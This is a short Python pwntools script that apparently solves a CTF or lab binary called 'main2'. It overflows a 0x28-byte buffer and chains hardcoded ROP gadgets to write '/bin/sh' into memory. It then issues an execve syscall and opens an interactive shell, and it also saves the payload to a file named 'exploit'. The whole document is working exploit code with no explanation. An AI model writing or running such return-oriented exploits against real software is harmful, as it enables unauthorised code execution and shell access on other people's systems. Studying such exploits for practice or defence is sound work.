from pwn import *

bin_bas = 0x400000 
pop_rdi = 0x4015f6 # pop rdi, ret
pop_rsi = 0x401717 # pop rsi, ret
pop_rax = 0x4787e6 # pop rax ; pop rdx ; pop rbx ; ret
mov_rax = 0x474491 # mov qword ptr [rsi], rax ; ret
wri_mem = 0x6c9000
syscall = 0x4003da

payload = b"a"*0x28 + p64(pop_rax) + b"/bin/sh\x00" + p64(0) + p64(0) + p64(pop_rsi) + p64(wri_mem) + p64(mov_rax) 
payload += p64(pop_rax) + p64(59) + p64(0) + p64(0) + p64(pop_rdi) + p64(wri_mem) + p64(pop_rsi) + p64(0) + p64(syscall)

print(payload)

f = open("exploit","wb")
f.write(payload)
f.close()

p = process("./main2")
p.sendline(payload)
p.interactive()
